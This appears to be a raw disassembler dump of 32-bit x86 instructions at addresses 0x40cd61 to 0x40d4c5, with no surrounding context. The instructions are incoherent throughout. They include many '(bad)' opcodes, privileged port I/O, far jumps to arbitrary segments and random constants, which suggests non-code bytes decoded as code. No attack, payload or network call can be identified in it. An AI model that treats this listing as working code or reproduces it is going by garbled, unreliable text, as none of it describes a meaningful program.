  40cd61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd62:	dec    ecx
  40cd63:	out    dx,al
  40cd64:	popa   
  40cd65:	jo     0x40cdcc
  40cd67:	sbb    BYTE PTR [ebx+0x4e7fc1ee],ch
  40cd6d:	(bad)  
  40cd6e:	ret    
  40cd6f:	inc    eax
  40cd70:	or     ebx,DWORD PTR [esi+0x77971815]
  40cd76:	sbb    ebx,edx
  40cd78:	cld    
  40cd79:	xor    ebp,DWORD PTR [edi+0xb2c1111]
  40cd7f:	mov    ecx,0xc53c44d
  40cd84:	or     esi,DWORD PTR [edi+0x35cfbf8a]
  40cd8a:	gs ins DWORD PTR es:[edi],dx
  40cd8c:	retf   0x8bd0
  40cd8f:	add    DWORD PTR [eax+0x46b2791b],ecx
  40cd95:	imul   eax,DWORD PTR [ecx+0x749480d3],0xd12b6494
  40cd9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cda0:	jb     0x40cd87
  40cda2:	jmp    0x66f1:0x90ffb40b
  40cda9:	inc    ebx
  40cdaa:	in     al,dx
  40cdab:	mov    edx,0xb59af31
  40cdb0:	xchg   esp,eax
  40cdb1:	pop    ebx
  40cdb2:	retf   0x3b29
  40cdb5:	les    ecx,FWORD PTR [eax]
  40cdb7:	or     ch,dl
  40cdb9:	fidiv  DWORD PTR [eax+0x24]
  40cdbc:	nop
  40cdbd:	mov    ds:0xff08cbe6,eax
  40cdc2:	mov    dh,0x38
  40cdc4:	sti    
  40cdc5:	add    BYTE PTR [ebp+0x3a9caf0d],0xf1
  40cdcc:	mov    ebx,0x2d106036
  40cdd1:	and    ch,BYTE PTR [edi-0x5b8f53d0]
  40cdd7:	xor    al,ch
  40cdd9:	sub    ch,bl
  40cddb:	xor    bl,cl
  40cddd:	xchg   edi,eax
  40cdde:	ins    BYTE PTR es:[edi],dx
  40cddf:	jmp    0x8dc1:0xd634e9cd
  40cde6:	push   edx
  40cde7:	dec    ebx
  40cde8:	sti    
  40cde9:	test   BYTE PTR [ebp+0x26],al
  40cdec:	rol    BYTE PTR [edi-0x3b],1
  40cdef:	jmp    0xc678:0x3d418a38
  40cdf6:	pop    esp
  40cdf7:	shl    dl,cl
  40cdf9:	daa    
  40cdfa:	dec    ebx
  40cdfb:	cli    
  40cdfc:	js     0x40cd89
  40cdfe:	mov    ecx,0x842bd834
  40ce03:	cmp    edi,ecx
  40ce05:	cdq    
  40ce06:	sub    DWORD PTR ds:0x8573f69e,ebx
  40ce0c:	(bad)  
  40ce0d:	fcomp  QWORD PTR [eax-0x6c]
  40ce10:	(bad)  
  40ce11:	mov    esi,0x8aab534f
  40ce16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce17:	fsub   QWORD PTR [esi+0x4d]
  40ce1a:	lods   al,BYTE PTR ds:[esi]
  40ce1b:	es in  al,dx
  40ce1d:	dec    esi
  40ce1e:	inc    esp
  40ce1f:	xchg   ebp,eax
  40ce20:	pop    edi
  40ce21:	repz clc 
  40ce23:	add    BYTE PTR [ebp-0x46],al
  40ce26:	push   ss
  40ce27:	push   ecx
  40ce28:	int    0x5a
  40ce2a:	out    dx,al
  40ce2b:	xlat   BYTE PTR ds:[ebx]
  40ce2c:	pushf  
  40ce2d:	jbe    0x40cdd5
  40ce2f:	mov    dh,0x94
  40ce31:	add    eax,0x20eaa7cc
  40ce36:	jp     0x40ce09
  40ce38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce39:	lods   al,BYTE PTR ds:[esi]
  40ce3a:	sub    edi,DWORD PTR [edi-0x7c]
  40ce3d:	pop    es
  40ce3e:	push   es
  40ce3f:	dec    ebp
  40ce40:	mov    cl,0x3
  40ce42:	shl    DWORD PTR [eax+eax*8],1
  40ce45:	jmp    0x43ae8a64
  40ce4a:	ret    0x6ef8
  40ce4d:	aaa    
  40ce4e:	and    DWORD PTR [ecx-0x3fd5a5d5],ecx
  40ce54:	fcomip st,st(5)
  40ce56:	fsubr  st,st(3)
  40ce58:	mov    dh,0xe5
  40ce5a:	bound  edi,QWORD PTR [ecx+0x5e]
  40ce5d:	push   0xf
  40ce5f:	xchg   ebp,eax
  40ce60:	inc    ecx
  40ce61:	inc    edx
  40ce62:	adc    ebp,DWORD PTR [ebx+ebp*2]
  40ce65:	dec    esi
  40ce66:	push   0x7457dc8e
  40ce6b:	and    al,0x53
  40ce6d:	ins    BYTE PTR es:[edi],dx
  40ce6e:	mov    bl,0x28
  40ce70:	push   esp
  40ce71:	pop    esi
  40ce72:	test   DWORD PTR [esi],ecx
  40ce74:	lea    ebp,[ecx+esi*4+0x34d65ced]
  40ce7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce7c:	xor    DWORD PTR ds:0x60a4b04e,edx
  40ce82:	stos   DWORD PTR es:[edi],eax
  40ce83:	mov    ds:0xccf3e40b,eax
  40ce88:	add    dh,BYTE PTR ds:0x9d059d9a
  40ce8e:	or     ebx,esi
  40ce90:	inc    esi
  40ce91:	dec    edi
  40ce92:	arpl   WORD PTR [edx],di
  40ce94:	icebp  
  40ce95:	jmp    0x40cf09
  40ce97:	in     eax,dx
  40ce98:	es dec esp
  40ce9a:	jg     0x40ce8f
  40ce9c:	cdq    
  40ce9d:	push   esp
  40ce9e:	enterw 0xe34d,0xcb
  40cea3:	jmp    0x40ced2
  40cea5:	mov    ah,0x9a
  40cea7:	dec    esp
  40cea8:	ins    DWORD PTR es:[edi],dx
  40cea9:	ds enter 0xa9a9,0xc8
  40ceae:	fnstenv [edi-0x70f594d3]
  40ceb4:	xchg   ecx,eax
  40ceb5:	clc    
  40ceb6:	adc    al,0xd9
  40ceb8:	add    eax,0x4bb8c7e9
  40cebd:	aam    0x71
  40cebf:	or     al,0xb4
  40cec1:	or     dh,ah
  40cec3:	pop    ebp
  40cec4:	rcl    DWORD PTR [eax-0x1b],cl
  40cec7:	add    al,0x44
  40cec9:	sub    eax,0x2306c3cd
  40cece:	outs   dx,BYTE PTR ds:[esi]
  40cecf:	dec    eax
  40ced0:	in     eax,0x28
  40ced2:	mov    ecx,DWORD PTR [edi-0x6ff60721]
  40ced8:	adc    BYTE PTR [edx-0x176d7c91],0xc2
  40cedf:	jmp    0xe710b3d
  40cee4:	lods   al,BYTE PTR ds:[esi]
  40cee5:	hlt    
  40cee6:	(bad)  
  40cee7:	in     al,0x1d
  40cee9:	jecxz  0x40cf2d
  40ceeb:	out    0xa1,eax
  40ceed:	mov    ebp,0xae92372a
  40cef2:	cmp    al,0x28
  40cef4:	cmp    al,0x8d
  40cef6:	lods   al,BYTE PTR ds:[esi]
  40cef7:	mov    BYTE PTR [edi+esi*2+0x75],0xa6
  40cefc:	mul    BYTE PTR [ebp+0x333c8d4e]
  40cf02:	sub    dl,bl
  40cf04:	aaa    
  40cf05:	ja     0x40ceaa
  40cf07:	pop    ebp
  40cf08:	repz fdiv DWORD PTR [ebx-0x5d]
  40cf0c:	fucomp st(4)
  40cf0e:	cmp    BYTE PTR [edi],bh
  40cf10:	sub    edx,DWORD PTR [esi+0x64ff64cd]
  40cf16:	and    BYTE PTR [ecx+0xeb45a71],al
  40cf1c:	jno    0x40cf57
  40cf1e:	xchg   esp,eax
  40cf1f:	dec    ebp
  40cf20:	call   0x966e2223
  40cf25:	imul   esp,DWORD PTR [ecx-0x6575480d],0x7a
  40cf2c:	sahf   
  40cf2d:	or     ah,BYTE PTR [eax]
  40cf2f:	push   0x65b4941e
  40cf34:	test   DWORD PTR [edi-0x415a9422],esp
  40cf3a:	pop    ecx
  40cf3b:	xor    cl,BYTE PTR [edi-0x31e99e5]
  40cf41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf42:	and    al,0x7a
  40cf44:	fcomp  DWORD PTR [edx-0x30]
  40cf47:	mov    edi,0x6db7117e
  40cf4c:	or     al,0x94
  40cf4e:	out    0x21,al
  40cf50:	mov    al,0x35
  40cf52:	pop    ds
  40cf53:	(bad)  
  40cf54:	mov    ebx,0xd3669d05
  40cf59:	es xchg esi,eax
  40cf5b:	popf   
  40cf5c:	cmp    al,BYTE PTR [ecx]
  40cf5e:	xchg   edx,eax
  40cf5f:	inc    ebp
  40cf60:	xlat   BYTE PTR ds:[ebx]
  40cf61:	inc    edi
  40cf62:	imul   esp,DWORD PTR [edi+0x21],0x5f
  40cf66:	les    edi,FWORD PTR [esi+0x3e0d367]
  40cf6c:	add    DWORD PTR [esi+0xd],edi
  40cf6f:	dec    ebp
  40cf70:	iret   
  40cf71:	dec    eax
  40cf72:	repz add eax,0x2309bac3
  40cf78:	xlat   BYTE PTR ds:[ebx]
  40cf79:	loope  0x40cfe3
  40cf7b:	lea    esp,[edx-0x79]
  40cf7e:	mov    edi,0xc39e70cd
  40cf83:	(bad)  
  40cf84:	cmp    eax,0xcc888b03
  40cf89:	inc    ebx
  40cf8a:	fldenv [edi]
  40cf8c:	jge    0x40cfef
  40cf8e:	nop
  40cf8f:	mov    ds:0x49b1c92d,eax
  40cf94:	fsub   DWORD PTR [edi-0x33]
  40cf97:	loope  0x40cf84
  40cf99:	push   eax
  40cf9a:	dec    eax
  40cf9b:	jmp    0xbdcae6ef
  40cfa0:	or     eax,0x897d38a3
  40cfa5:	clc    
  40cfa6:	pop    ebp
  40cfa7:	mov    DWORD PTR [ebx-0x53],ebp
  40cfaa:	pop    esp
  40cfab:	fild   WORD PTR [ebx-0x7b91b69b]
  40cfb1:	daa    
  40cfb2:	loopne 0x40d029
  40cfb4:	xlat   BYTE PTR ds:[ebx]
  40cfb5:	jbe    0x40d005
  40cfb7:	(bad)  
  40cfb8:	in     al,0xd4
  40cfba:	sti    
  40cfbb:	scas   al,BYTE PTR es:[edi]
  40cfbc:	outs   dx,DWORD PTR cs:[esi]
  40cfbe:	imul   edx,DWORD PTR [ebp+edx*8-0x780257d],0x7c06d454
  40cfc9:	xchg   edx,eax
  40cfca:	pmaxsw mm2,QWORD PTR ds:0x8b015867
  40cfd1:	xor    dl,BYTE PTR [edi]
  40cfd3:	sbb    eax,0xd0cbbf3c
  40cfd8:	bound  ebx,QWORD PTR [edi+eiz*4+0x4c398a54]
  40cfdf:	mov    BYTE PTR [ebx+0x7b9bc87b],cl
  40cfe5:	jecxz  0x40cfbd
  40cfe7:	push   0xfa215f78
  40cfec:	fisub  WORD PTR [edi+0x3f9e160]
  40cff2:	je     0x40d05b
  40cff4:	xor    eax,0xc4984c2e
  40cff9:	or     eax,0x8b296176
  40cffe:	mov    al,ds:0x62a0a593
  40d003:	mov    BYTE PTR [edx],0x57
  40d006:	cmp    al,0xb8
  40d008:	jae    0x40cfca
  40d00a:	(bad)  
  40d00c:	leave  
  40d00d:	mov    es,ecx
  40d00f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d010:	dec    esp
  40d011:	inc    eax
  40d012:	dec    esi
  40d013:	fistp  DWORD PTR [edx+0xf3cc84b]
  40d019:	pop    esp
  40d01a:	bound  ebp,QWORD PTR [esi+0x1a]
  40d01d:	dec    esp
  40d01e:	fiadd  WORD PTR [edx-0x8]
  40d021:	jmp    0x40cfad
  40d023:	jle    0x40d06e
  40d025:	mov    eax,DWORD PTR [edx-0xe]
  40d028:	xabort 0x62
  40d02b:	inc    esp
  40d02c:	sub    al,0xe
  40d02e:	push   ecx
  40d02f:	leave  
  40d030:	leave  
  40d031:	mov    DWORD PTR [edi],ecx
  40d033:	sbb    eax,0x2d3e69c2
  40d038:	fdecstp 
  40d03a:	xor    cl,BYTE PTR [edi-0x3]
  40d03d:	mov    BYTE PTR [edx+edi*4],dl
  40d040:	pop    eax
  40d041:	cld    
  40d042:	int    0xdf
  40d044:	dec    edx
  40d045:	test   eax,0xbe611c77
  40d04a:	or     eax,0xf78ef0df
  40d04f:	punpcklwd mm1,DWORD PTR [esi-0x13]
  40d053:	pop    esi
  40d054:	sbb    cl,BYTE PTR cs:[ebp+0x4e]
  40d058:	ret    
  40d059:	leave  
  40d05a:	jne    0x40d0c9
  40d05c:	(bad)
  40d05f:	jne    0x40d02f
  40d061:	xchg   BYTE PTR fs:[ebp-0xb],dl
  40d065:	lods   al,BYTE PTR ds:[esi]
  40d066:	(bad)  
  40d067:	std    
  40d068:	adc    DWORD PTR [ecx],ebp
  40d06a:	fld    st(2)
  40d06c:	popf   
  40d06d:	pop    ebx
  40d06e:	lahf   
  40d06f:	and    dl,dl
  40d071:	push   ebx
  40d072:	in     eax,0x7b
  40d074:	push   ebp
  40d075:	sti    
  40d076:	inc    edx
  40d077:	call   0x4dda6d44
  40d07c:	je     0x40d005
  40d07e:	out    dx,eax
  40d07f:	cmp    edi,DWORD PTR [esi]
  40d081:	cmp    DWORD PTR [eax+eiz*1-0x45],ebp
  40d085:	test   eax,0x692dd013
  40d08a:	push   esp
  40d08b:	xor    esi,0x65
  40d08e:	popf   
  40d08f:	sbb    cl,BYTE PTR [ecx]
  40d091:	jae    0x40d0bb
  40d093:	inc    eax
  40d094:	mov    al,BYTE PTR [edi+0x445a780e]
  40d09a:	xchg   cl,cl
  40d09c:	add    bh,cl
  40d09e:	jecxz  0x40d0ad
  40d0a0:	mov    fs,ecx
  40d0a2:	mov    eax,0x4fb35eb
  40d0a7:	loope  0x40d031
  40d0a9:	sbb    esi,DWORD PTR [ecx+0x144240be]
  40d0af:	jne    0x40d04a
  40d0b1:	cld    
  40d0b2:	pop    ebp
  40d0b3:	sbb    eax,DWORD PTR [edx+ebp*2]
  40d0b6:	int    0x45
  40d0b8:	in     al,0xbf
  40d0ba:	lods   al,BYTE PTR ds:[esi]
  40d0bb:	stos   DWORD PTR es:[edi],eax
  40d0bc:	stos   DWORD PTR es:[edi],eax
  40d0bd:	dec    ebx
  40d0be:	mov    ebx,0x82566a94
  40d0c3:	push   esp
  40d0c4:	pop    ds
  40d0c5:	sbb    DWORD PTR [edx+0xc8ac93d],ecx
  40d0cb:	xor    esi,DWORD PTR [ebx+edi*4-0x1c368f28]
  40d0d2:	fnstcw WORD PTR [eax-0x60ac780a]
  40d0d8:	fmul   QWORD PTR [edx-0x5cc9006e]
  40d0de:	retf   
  40d0df:	stos   BYTE PTR es:[edi],al
  40d0e0:	ss aaa 
  40d0e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0e3:	(bad)  
  40d0e6:	inc    edx
  40d0e7:	fnsave [edi+edx*1+0x502fe077]
  40d0ee:	int3   
  40d0ef:	std    
  40d0f0:	js     0x40d0ff
  40d0f2:	inc    edx
  40d0f3:	xor    BYTE PTR [esi-0x33],0x75
  40d0f7:	mov    cl,0xe
  40d0f9:	pusha  
  40d0fa:	outs   dx,DWORD PTR ds:[esi]
  40d0fb:	mov    gs,WORD PTR [eiz*8-0x7fb96234]
  40d102:	iret   
  40d103:	(bad)  
  40d104:	out    dx,eax
  40d105:	not    DWORD PTR ds:0xe035ac48
  40d10b:	sub    eax,0xc5e608c0
  40d110:	or     esp,ebx
  40d112:	mov    eax,ds:0xad0ff1d7
  40d117:	out    0x15,eax
  40d119:	sub    al,0xad
  40d11b:	jecxz  0x40d12d
  40d11d:	mov    al,ds:0x752efca7
  40d122:	push   eax
  40d123:	loopne 0x40d19c
  40d125:	dec    edi
  40d126:	sbb    DWORD PTR [esi+0x6f],edx
  40d129:	inc    edi
  40d12a:	not    BYTE PTR [edx]
  40d12c:	sbb    al,0x5d
  40d12e:	fstp   QWORD PTR [esi+eiz*2-0x5a03267]
  40d135:	repz jne 0x40d0f3
  40d138:	rol    ah,0x95
  40d13b:	lods   eax,DWORD PTR ds:[esi]
  40d13c:	dec    esi
  40d13d:	in     al,0xb1
  40d13f:	repz fmul DWORD PTR [edi-0x63]
  40d143:	ja     0x40d14b
  40d145:	or     BYTE PTR [edx+0x604b0383],bl
  40d14b:	sbb    BYTE PTR [esi-0x6dfa58b1],bl
  40d151:	int    0xa4
  40d153:	or     ch,bh
  40d155:	sub    BYTE PTR [edi+eiz*4-0x71],ah
  40d159:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d15a:	jp     0x40d1c5
  40d15c:	outs   dx,DWORD PTR ds:[esi]
  40d15d:	cmp    ecx,DWORD PTR [ebx-0x2]
  40d160:	cmp    DWORD PTR [eax-0x1a5e1185],edx
  40d166:	loopne 0x40d13e
  40d168:	(bad)  
  40d169:	inc    ebx
  40d16a:	xchg   edx,eax
  40d16b:	jo     0x40d0f3
  40d16d:	call   0x337a3353
  40d172:	mov    ch,0xf6
  40d174:	outs   dx,DWORD PTR ds:[esi]
  40d175:	xor    BYTE PTR [ebp+0x2e],al
  40d178:	aas    
  40d179:	add    DWORD PTR [edx-0x69a351fc],0x59d76e41
  40d183:	scas   eax,DWORD PTR es:[edi]
  40d184:	adc    DWORD PTR [eax+0x16cee66d],ecx
  40d18a:	cwde   
  40d18b:	pop    esp
  40d18c:	mov    DWORD PTR [esi-0x14769f1c],eax
  40d192:	std    
  40d193:	inc    ebp
  40d194:	(bad)  
  40d196:	loopne 0x40d1f9
  40d198:	adc    eax,0xed7c86a9
  40d19d:	into   
  40d19e:	(bad)  
  40d19f:	stc    
  40d1a0:	fimul  DWORD PTR [ebp-0x2fce34f9]
  40d1a6:	and    ebp,ebp
  40d1a8:	dec    DWORD PTR [ecx-0x9335d4f]
  40d1ae:	in     al,dx
  40d1af:	out    dx,al
  40d1b0:	mov    cl,0x7
  40d1b2:	dec    edx
  40d1b3:	adc    eax,0x2bf3c35c
  40d1b8:	(bad)  
  40d1bb:	xchg   ebx,eax
  40d1bc:	aas    
  40d1bd:	loop   0x40d210
  40d1bf:	push   eax
  40d1c0:	mov    esp,0xf30dc18c
  40d1c5:	sub    ebx,DWORD PTR [ecx-0x1c]
  40d1c8:	sbb    DWORD PTR [ebp+0x20],0x26
  40d1cc:	daa    
  40d1cd:	pushf  
  40d1ce:	xchg   BYTE PTR [edi+eiz*1],dl
  40d1d1:	aad    0x71
  40d1d3:	mov    esp,0xe240c44b
  40d1d8:	xchg   dl,bh
  40d1da:	add    DWORD PTR [ebp-0x67cc5b3c],esp
  40d1e0:	xchg   esp,eax
  40d1e1:	(bad)  
  40d1e2:	enter  0xa491,0x1b
  40d1e6:	dec    edi
  40d1e7:	dec    edx
  40d1e8:	jae    0x40d1b3
  40d1ea:	aaa    
  40d1eb:	mov    bl,dh
  40d1ed:	mov    cl,al
  40d1ef:	fnsave [ecx-0x3f]
  40d1f2:	scas   eax,DWORD PTR es:[edi]
  40d1f3:	scas   al,BYTE PTR es:[edi]
  40d1f4:	(bad)  
  40d1f5:	pop    esp
  40d1f6:	lds    eax,FWORD PTR [ecx+esi*1]
  40d1f9:	in     al,0xef
  40d1fb:	fcmovbe st,st(5)
  40d1fd:	xchg   ebx,eax
  40d1fe:	sahf   
  40d1ff:	imul   esi,esi,0x364852c5
  40d205:	xchg   ebx,eax
  40d206:	sbb    eax,DWORD PTR [edx]
  40d208:	jnp    0x40d203
  40d20a:	sub    esp,edx
  40d20c:	add    eax,0x60a023f7
  40d211:	cli    
  40d212:	iret   
  40d213:	inc    ecx
  40d214:	or     esi,DWORD PTR [eax+esi*1+0x7f]
  40d218:	jl     0x40d26d
  40d21a:	in     al,0x0
  40d21c:	es jmp 0x40d292
  40d21f:	jle    0x40d1e1
  40d221:	sbb    al,0xa4
  40d224:	add    DWORD PTR [esi-0x67],edx
  40d227:	xor    dl,BYTE PTR [eax-0x641f88b0]
  40d22d:	out    dx,eax
  40d22e:	xor    al,0xa
  40d230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d231:	sub    ebp,DWORD PTR [eax+0xe]
  40d234:	aaa    
  40d235:	pop    ecx
  40d236:	sub    ch,dl
  40d238:	nop
  40d239:	inc    eax
  40d23a:	mov    ecx,0x88777e3e
  40d23f:	lea    eax,[eax-0x2b8a342e]
  40d245:	sub    esi,0x789c98fd
  40d24b:	mov    ebp,0xa95839d3
  40d250:	outs   dx,BYTE PTR ds:[esi]
  40d251:	sbb    al,0xb0
  40d253:	pop    ebx
  40d254:	jmp    0x40d25a
  40d256:	(bad)  
  40d257:	gs loopne 0x40d2b2
  40d25a:	outs   dx,DWORD PTR ds:[esi]
  40d25b:	xchg   esi,eax
  40d25c:	sbb    eax,0x777f07e9
  40d261:	sub    edi,DWORD PTR [ebp-0x24]
  40d264:	jae    0x40d2bd
  40d266:	pop    esi
  40d267:	push   edi
  40d268:	inc    edx
  40d269:	mov    ds:0x5ec6842e,al
  40d26e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d26f:	imul   edi,DWORD PTR [ebp+0x3f057086],0x31
  40d276:	lahf   
  40d277:	and    bl,BYTE PTR [ecx+0x21]
  40d27a:	les    ebp,FWORD PTR [edi]
  40d27c:	mov    edi,ds
  40d27e:	pop    es
  40d27f:	jmp    0xc6a9:0x6643083f
  40d286:	adc    eax,0x812eca7
  40d28b:	lock aad 0x99
  40d28e:	jecxz  0x40d264
  40d290:	not    BYTE PTR [eax+edx*8+0x61ea9863]
  40d297:	inc    esp
  40d298:	pushf  
  40d299:	inc    edx
  40d29a:	(bad)  
  40d29b:	adc    esp,edi
  40d29d:	mov    ds:0x860fbb6f,eax
  40d2a2:	or     al,0xed
  40d2a4:	pop    ss
  40d2a5:	sahf   
  40d2a6:	push   edi
  40d2a7:	and    esp,DWORD PTR [eax-0x178b0aa5]
  40d2ad:	arpl   bp,dx
  40d2af:	test   al,0xd4
  40d2b1:	xchg   ecx,eax
  40d2b2:	or     DWORD PTR [eax],eax
  40d2b4:	add    BYTE PTR [ebp+0x53d0a60a],cl
  40d2ba:	hlt    
  40d2bb:	test   BYTE PTR [edi],0xa3
  40d2be:	out    dx,eax
  40d2bf:	xchg   esp,eax
  40d2c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2c1:	ror    BYTE PTR [ebx-0x48bfb8f6],0xec
  40d2c8:	mov    edi,0xd5f6796
  40d2cd:	inc    ecx
  40d2ce:	hlt    
  40d2cf:	adc    eax,0xe4bc446e
  40d2d4:	jnp    0x40d2eb
  40d2d6:	cld    
  40d2d7:	mov    edx,0x4a5b027b
  40d2dc:	je     0x40d2ea
  40d2de:	lods   al,BYTE PTR ds:[esi]
  40d2df:	inc    esi
  40d2e0:	or     BYTE PTR [edx+0x50],dl
  40d2e3:	pushf  
  40d2e4:	cmp    ebx,DWORD PTR [ebp-0x8d903f2]
  40d2ea:	jp     0x40d31a
  40d2ec:	fisttp WORD PTR [ecx]
  40d2ee:	(bad)  [ecx]
  40d2f0:	dec    edi
  40d2f1:	mov    esp,0x10946b0d
  40d2f6:	bound  eax,QWORD PTR [edi]
  40d2f8:	popa   
  40d2f9:	lahf   
  40d2fa:	(bad)  
  40d2fb:	jp     0x40d291
  40d2fd:	aam    0xe0
  40d2ff:	or     DWORD PTR [eax+0x10a3a203],ebp
  40d305:	hlt    
  40d306:	xchg   ebp,eax
  40d307:	dec    esi
  40d308:	mov    bh,0xec
  40d30a:	add    eax,0xfd8979b
  40d30f:	mov    DWORD PTR [ecx-0x12],eax
  40d312:	mov    ecx,0xac226cae
  40d317:	jge    0x40d327
  40d319:	adc    DWORD PTR [ebp+ebx*2-0x7a],esp
  40d31d:	mov    ebx,0x80c57371
  40d322:	sub    DWORD PTR [eax-0x499cea2e],eax
  40d328:	mov    cl,0x84
  40d32a:	test   eax,0x6735b9ff
  40d32f:	add    BYTE PTR [ecx],cl
  40d331:	gs mov edi,0xc27a619c
  40d337:	int    0x2d
  40d339:	repz cli 
  40d33b:	dec    eax
  40d33c:	inc    ecx
  40d33d:	ins    DWORD PTR es:[edi],dx
  40d33e:	cmp    dh,BYTE PTR [ebp+ecx*4+0x438388b2]
  40d345:	xchg   esp,eax
  40d346:	pop    ebp
  40d347:	xlat   BYTE PTR ds:[ebx]
  40d348:	dec    esp
  40d349:	xchg   esi,eax
  40d34a:	into   
  40d34b:	loop   0x40d3be
  40d34d:	fwait
  40d34e:	punpcklbw mm7,mm6
  40d351:	push   ebx
  40d352:	mov    edx,0x172e58e0
  40d357:	mov    ebp,0xa17f7045
  40d35c:	stc    
  40d35d:	lds    ecx,FWORD PTR [esi]
  40d35f:	xor    DWORD PTR [eax+0x6f],0x52
  40d363:	stos   BYTE PTR es:[edi],al
  40d364:	(bad)  
  40d366:	bound  eax,QWORD PTR [ebx+0x3f]
  40d369:	popf   
  40d36a:	push   es
  40d36b:	mov    bl,0xb7
  40d36d:	adc    al,0x57
  40d36f:	cmp    eax,0x1eb00ec3
  40d374:	std    
  40d375:	dec    ebp
  40d376:	icebp  
  40d377:	rol    ebx,0x27
  40d37a:	cmp    DWORD PTR [ecx],0x8
  40d37d:	aaa    
  40d37e:	mov    WORD PTR ds:0x9cfd29ff,ss
  40d384:	sbb    ecx,ebp
  40d386:	ss inc edi
  40d388:	pop    es
  40d389:	sar    DWORD PTR [eax+0x1a],cl
  40d38c:	arpl   WORD PTR [esi+0x4c],di
  40d38f:	mov    dh,ah
  40d391:	mov    cs,WORD PTR [ebx+0x50]
  40d394:	dec    edi
  40d395:	adc    DWORD PTR [ebx+eax*1-0x2d],0x3048bf95
  40d39d:	cmp    al,0xa4
  40d39f:	pop    edi
  40d3a0:	xchg   edx,eax
  40d3a1:	inc    esp
  40d3a2:	js     0x40d37f
  40d3a4:	add    al,bh
  40d3a6:	sub    ch,bl
  40d3a8:	pop    eax
  40d3a9:	out    dx,eax
  40d3aa:	pop    ss
  40d3ab:	mov    ds:0x2b10f7ab,al
  40d3b0:	ffree  st(2)
  40d3b2:	xor    esi,esp
  40d3b4:	pusha  
  40d3b5:	adc    edi,DWORD PTR [esp+edx*1]
  40d3b8:	or     ch,BYTE PTR [edx]
  40d3ba:	xchg   ebp,eax
  40d3bb:	add    eax,0x8a0f41b9
  40d3c0:	repnz aad 0x8d
  40d3c3:	ins    DWORD PTR es:[edi],dx
  40d3c4:	push   ebx
  40d3c5:	add    edi,DWORD PTR [esi]
  40d3c7:	(bad)  
  40d3c8:	cld    
  40d3c9:	pop    ebx
  40d3ca:	stos   BYTE PTR es:[edi],al
  40d3cb:	add    DWORD PTR [ecx],ebx
  40d3cd:	ins    BYTE PTR es:[edi],dx
  40d3ce:	jne    0x40d3ec
  40d3d0:	add    DWORD PTR ds:0xf376ab54,eax
  40d3d6:	mov    ebp,0x893f5c29
  40d3db:	(bad)  
  40d3dc:	shr    al,cl
  40d3de:	or     DWORD PTR [eax+0x55230fe2],ecx
  40d3e4:	pop    ebp
  40d3e5:	inc    ebp
  40d3e6:	xchg   edx,eax
  40d3e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3e8:	jnp    0x40d396
  40d3ea:	inc    edi
  40d3eb:	or     eax,0xacd751ec
  40d3f0:	mov    esp,0x94e66e2e
  40d3f5:	mov    bl,0x34
  40d3f7:	loope  0x40d428
  40d3f9:	pop    edi
  40d3fa:	and    ch,BYTE PTR [ebp+0x56]
  40d3fd:	adc    edx,DWORD PTR [edx+0x3636f595]
  40d403:	out    0x21,al
  40d405:	retf   
  40d406:	push   ds
  40d407:	or     al,0x3d
  40d409:	adc    bh,dh
  40d40b:	fidivr WORD PTR [ecx+0x43]
  40d40e:	je     0x40d41f
  40d410:	xor    BYTE PTR [ecx-0x5f],dl
  40d413:	daa    
  40d414:	jge    0x40d461
  40d416:	js     0x40d456
  40d418:	shr    DWORD PTR [edi+esi*1+0x507aa83b],0x7e
  40d420:	and    BYTE PTR [ebx],ch
  40d422:	dec    edi
  40d423:	sar    DWORD PTR [ecx+0x6be083c9],0x38
  40d42a:	mov    cl,0x35
  40d42c:	into   
  40d42d:	stos   BYTE PTR es:[edi],al
  40d42e:	mov    ebp,DWORD PTR [ebp+0x1f2c570e]
  40d434:	jge    0x40d42a
  40d436:	cmc    
  40d437:	(bad)  [ebx-0x2a9968]
  40d43d:	xor    esi,edx
  40d43f:	int    0x65
  40d441:	sub    BYTE PTR [ebx+0x77],0x19
  40d445:	push   ecx
  40d446:	mov    cl,0xbc
  40d448:	mov    WORD PTR [edx+0x41988743],?
  40d44e:	adc    eax,0xedbeed61
  40d453:	outs   dx,DWORD PTR ds:[esi]
  40d454:	iret   
  40d455:	cdq    
  40d456:	pop    ebp
  40d457:	mov    ebp,0xf4958033
  40d45c:	jae    0x40d48c
  40d45e:	aaa    
  40d45f:	and    eax,0x1281522b
  40d464:	call   0x3147:0x727f7858
  40d46b:	ret    
  40d46c:	xchg   edi,eax
  40d46d:	jecxz  0x40d3f0
  40d46f:	jnp    0x40d44a
  40d471:	(bad)  
  40d472:	in     al,dx
  40d473:	xchg   ebp,eax
  40d474:	call   0x60a8:0x3a7f14d1
  40d47b:	jmp    0x9e79f920
  40d480:	jmp    0xe690:0xee866831
  40d487:	rcl    BYTE PTR ds:0xd9d30368,1
  40d48d:	pop    ebx
  40d48e:	pop    ebp
  40d48f:	aas    
  40d490:	add    DWORD PTR [ebp+0x1e],ecx
  40d493:	mov    eax,0xa7d03e30
  40d498:	jne    0x40d4de
  40d49a:	in     eax,dx
  40d49b:	jge    0x40d45b
  40d49d:	retf   
  40d49e:	mov    DWORD PTR [eax],eax
  40d4a0:	aas    
  40d4a1:	mov    cl,0xe7
  40d4a3:	loop   0x40d456
  40d4a5:	call   0x2d97:0x1e36bd10
  40d4ac:	fild   WORD PTR ds:0x3d2f2442
  40d4b2:	mov    dh,0x9
  40d4b4:	dec    BYTE PTR [edx+0x7c]
  40d4b7:	popf   
  40d4b8:	jmp    0x40d4b6
  40d4ba:	cmp    bl,BYTE PTR [edx-0x4a474b6e]
  40d4c0:	xor    DWORD PTR [edx-0x55],edi
  40d4c3:	pop    ebx
  40d4c4:	clc    
  40d4c5:	xor    DWORD PTR [eax-0x2b],ebp
